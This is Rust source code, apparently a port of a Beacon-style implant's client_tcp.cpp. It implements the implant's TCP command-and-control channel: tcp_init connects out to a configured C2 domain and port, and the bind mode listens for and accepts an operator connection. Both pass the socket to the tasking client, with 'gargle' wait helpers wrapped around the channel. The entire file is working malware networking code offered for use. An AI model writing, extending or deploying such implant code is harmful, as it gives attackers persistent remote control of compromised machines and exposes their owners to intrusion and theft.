//! Port of client_tcp.cpp — Manage the TCP channel.
//!
//! Provides the reverse/bind TCP C2 servers for Beacon: `tcp_init` connects
//! out (reverse), `tcp_server_wait` accepts an inbound connection (bind),
//! and both hand the resulting socket to the shared `client` subsystem.

use crate::beacon::{SETTING_BINDHOST, SETTING_DOMAINS, SETTING_PORT};
use crate::client::{client_close, client_init, client_process, client_stop};
use crate::link::{lchannel_tcp, LChannel};
use crate::settings::{setting_int, setting_ptr, setting_short};
use crate::state;
use parking_lot::Mutex;
use windows_sys::Win32::Networking::WinSock::{
    bind, closesocket, listen, socket, AF_INET, INVALID_SOCKET, SOCKADDR, SOCKADDR_IN,
    SOCKET_ERROR, SOCK_STREAM,
};

/// Our server socket (client_tcp.cpp `static SOCKET server`). Stored as an
/// isize (C++ SOCKET); zero-initialized like the C++ global.
static SERVER: Mutex<isize> = Mutex::new(0);

/// `wsconnect` lives in commands.cpp (ported to commands.rs); re-export it so
/// `crate::client_tcp::wsconnect` resolves the same way the C++ linkage did.
pub use crate::commands::wsconnect;

/// Re-export the gargle TCP helpers under their C++ names.
#[allow(non_snake_case)]
pub use crate::gargle_pivot_tcp::gargle_accept as GargleAccept;
#[allow(non_snake_case)]
pub use crate::gargle_pivot_tcp::gargle_wait_tcp as GargleWaitTCP;

/* call our gargle function */
unsafe extern "C" fn link_channel_tcp_wait(thisp: *mut core::ffi::c_void) {
    let inst = &mut *(thisp as *mut LChannel);
    crate::gargle_pivot_tcp::gargle_wait_tcp(inst.socket);
}

/* create a new kind of channel */
fn lchannel_tcp_gargle(socket: isize) -> LChannel {
    let mut channel = lchannel_tcp(socket);
    channel.wait = Some(link_channel_tcp_wait);
    channel
}

/* init our connection */
pub fn tcp_init() -> bool {
    /* set post type to POST_TCP now... since everything seems OK */
    state::set_post_type(crate::commands::POST_TCP);

    /* init our winsock socket */
    crate::channel_tcp::channel_winsock_init();

    /* connect! */
    let targetip = setting_ptr(SETTING_DOMAINS).unwrap_or(b"");
    let port = setting_short(SETTING_PORT) as i32;
    let server = wsconnect(targetip, port);
    if server == INVALID_SOCKET as isize {
        return false;
    }

    *SERVER.lock() = server;

    /* initialize our client (IF we were successful) */
    client_init(lchannel_tcp_gargle(server));

    /* alright, this is good to go */
    true
}

/* init our connection */
fn tcp_server_wait(bindto: u32) -> bool {
    /* set post type to POST_TCP now... since everything seems OK */
    state::set_post_type(crate::commands::POST_TCP);

    /* setup our socket */
    let serversock = unsafe { socket(AF_INET as i32, SOCK_STREAM, 0) };
    if serversock == INVALID_SOCKET {
        unsafe {
            closesocket(serversock);
        }
        return false;
    }

    /* specify the host/port we want to bind to */
    let mut sock: SOCKADDR_IN = unsafe { std::mem::zeroed() };
    sock.sin_family = AF_INET as u16;
    sock.sin_port = setting_short(SETTING_PORT).to_be(); // htons(...)
    sock.sin_addr.S_un.S_addr = bindto;

    /* start our server */
    let status = unsafe {
        bind(
            serversock,
            &sock as *const SOCKADDR_IN as *const SOCKADDR,
            std::mem::size_of::<SOCKADDR_IN>() as i32,
        )
    };
    if status == SOCKET_ERROR {
        unsafe {
            closesocket(serversock);
        }
        return false;
    }

    /* listen for a connection... *pHEAR* */
    let status = unsafe { listen(serversock, 120) };
    if status == SOCKET_ERROR {
        unsafe {
            closesocket(serversock);
        }
        return false;
    }

    /* try to accept our connection */
    let server = crate::gargle_pivot_tcp::gargle_accept(serversock as isize);

    if server != INVALID_SOCKET as isize {
        *SERVER.lock() = server;

        /* initialize our connection, please */
        client_init(lchannel_tcp_gargle(server));
        unsafe {
            closesocket(serversock);
        }
        true
    } else {
        unsafe {
            closesocket(serversock);
        }
        false
    }
}

/*
 *  kill our named pipe (done)
 */
pub fn tcp_stop() {
    /* do the right thing for our TCP socket */
    unsafe {
        closesocket(*SERVER.lock() as _);
    }

    /* free up some of our data */
    client_stop();
}

/*
 * put this beacon into a mode where it's waiting for a connection to its pipe
 */
pub fn command_tcp_reverse_start() {
    /* setup our SMB server */
    if !tcp_init() {
        return;
    }

    /* process data */
    client_process();

    /* close down the client too */
    client_close();

    /* OK, time to shut it down */
    tcp_stop();

    /* just kill the process... it's this or crash */
    crate::thread::safe_exit();
}

/*
* put this beacon into a mode where it's waiting for a connection to its socket
*/
pub fn command_tcp_bind_start() {
    /* our bind host, might be 127.0.0.1 when staging a bind_tcp Beacon locally */
    let bindto = setting_int(SETTING_BINDHOST).to_be(); // htonl(...)

    /* init winsock */
    crate::channel_tcp::channel_winsock_init();

    /* while we are an SMB server... do this stuff */
    while state::sleep_time() > 0 {
        /* wait for a connection and send our agent id */
        if !tcp_server_wait(bindto) {
            break;
        }

        /* process data */
        client_process();

        /* kill the client */
        client_close();

        /* close the session */
        unsafe {
            closesocket(*SERVER.lock() as _);
        }
    }

    /* we're no longer an SMB server... stop the shenanigans */
    tcp_stop();

    /* just kill the process... it's this or crash */
    crate::thread::safe_exit();
}
